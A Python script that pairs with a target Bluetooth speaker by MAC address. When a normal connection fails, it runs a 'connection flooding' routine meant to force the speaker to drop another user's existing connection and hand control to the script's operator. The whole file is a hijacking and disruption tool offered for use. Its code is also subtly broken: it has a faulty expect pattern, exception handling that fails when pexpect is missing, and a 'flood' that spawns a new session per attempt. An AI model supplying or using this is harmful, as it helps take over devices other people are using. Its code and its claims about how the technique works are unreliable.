import subprocess
import time
import re

# --- CONFIGURATION ---
# The MAC address of the Bluetooth speaker you want to control.
# Find this using `bluetoothctl scan on` or from your speaker's documentation.
SPEAKER_MAC = "XX:XX:XX:XX:XX:XX" 

# Your device's MAC address (optional, but good for specificity)
# You can find this with `hciconfig` or `ip addr show | grep -i bluetooth`
# OWN_DEVICE_MAC = "YY:YY:YY:YY:YY:YY"

# --- END CONFIGURATION ---

def run_bluetoothctl_command(command):
    """Runs a bluetoothctl command and returns its output."""
    try:
        # Use pexpect to interact with the bluetoothctl interactive shell
        import pexpect
        child = pexpect.spawn('bluetoothctl')
        child.expect('[bluetooth]#')
        child.sendline(command)
        child.expect('[bluetooth]#')
        output = child.before.decode('utf-8')
        child.sendline('exit')
        child.wait()
        return output
    except (pexpect.exceptions.EOF, pexpect.exceptions.TIMEOUT):
        print("Error: Failed to execute command or timed out.")
        return None
    except ImportError:
        print("Error: pexpect library not found. Please install it: pip install pexpect")
        return None

def is_device_paired(mac_address):
    """Checks if a device is already paired."""
    output = run_bluetoothctl_command("paired-devices")
    if output and mac_address in output:
        print(f"Device {mac_address} is already paired.")
        return True
    return False

def pair_device(mac_address):
    """Pairs with the device if not already paired."""
    if is_device_paired(mac_address):
        return True
    print(f"Attempting to pair with {mac_address}...")
    output = run_bluetoothctl_command(f"pair {mac_address}")
    if output and "Pairing successful" in output:
        print("Pairing successful.")
        return True
    else:
        print("Pairing failed.")
        print("--- Output ---")
        print(output)
        print("--- End Output ---")
        return False

def connect_device(mac_address):
    """Connects to the device. This often disconnects other devices."""
    print(f"Attempting to connect to {mac_address}...")
    output = run_bluetoothctl_command(f"connect {mac_address}")
    if output and "Connection successful" in output:
        print("Connection successful. The other device should now be disconnected.")
        return True
    else:
        print("Initial connection attempt failed or was interrupted.")
        print("--- Output ---")
        print(output)
        print("--- End Output ---")
        return False

def force_disconnect_via_flood(mac_address, attempts=10, delay=0.5):
    """
    Aggressively attempts to connect multiple times to flood the speaker
    and force it to drop any existing connection.
    """
    print(f"Attempting to force disconnect via connection flooding ({attempts} attempts)...")
    for i in range(attempts):
        print(f"  Attempt {i+1}/{attempts}...")
        # The 'connect' command itself is the packet we're sending.
        # We don't care if it fails, we just want to send the packet.
        run_bluetoothctl_command(f"connect {mac_address}")
        time.sleep(delay)
    
    # After flooding, try one clean connection
    print("Flooding complete. Attempting a clean connection...")
    time.sleep(2)
    return connect_device(mac_address)


def main():
    """Main function to execute the control sequence."""
    print("--- Bluetooth Speaker Control Script ---")
    print(f"Target Speaker MAC: {SPEAKER_MAC}")
    
    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", SPEAKER_MAC):
        print("Error: Invalid MAC address format. Please update SPEAKER_MAC.")
        return

    # Step 1: Ensure the device is paired
    if not pair_device(SPEAKER_MAC):
        print("Cannot proceed without pairing. Exiting.")
        return

    # Step 2: Try a standard connection first
    if connect_device(SPEAKER_MAC):
        print("Successfully connected. Script finished.")
        return

    # Step 3: If standard connection fails, use the force method
    print("Standard connection failed. Escalating to force disconnect method.")
    if force_disconnect_via_flood(SPEAKER_MAC):
        print("Successfully connected after forcing a disconnect.")
    else:
        print("Failed to connect to the speaker. It may be out of range,")
        print("or its firmware may be resistant to this technique.")

if __name__ == "__main__":
    # This script MUST be run with sudo for bluetoothctl to have permissions.
    # Example: sudo python your_script_name.py
    main()
